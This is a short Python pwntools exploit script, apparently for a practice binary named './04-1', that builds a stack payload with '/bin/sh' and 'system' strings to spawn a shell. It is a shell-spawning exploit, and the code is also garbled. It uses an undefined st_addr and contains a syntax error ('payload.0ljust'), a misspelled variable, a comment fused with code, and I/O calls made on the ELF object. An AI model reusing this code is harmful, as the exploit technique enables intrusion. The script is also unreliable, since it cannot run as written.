# coding=utf-8
#!/usr/bin/env python
from pwn import *
from LibcSearcher import LibcSearcher
sh = process('./04-1')
 
aaa = ELF('./04-1')
 
#
payload= "/bin/shx00".ljust(0x1e, "A")+ "systemx00"
#0x3a-0x1c
payload=payload.ljust(0x2e, "a")+p32(st_addr)
#ret
payload=payload.0ljust(0x3e, "a") 
#ebppayload+=p32(0) 
#返回地址
paylaod+=p32(0xdeadbeef) #参数 1

aaa.recvuntil( "your input : ") 
aaa.sendline(payload)
aaa.interactive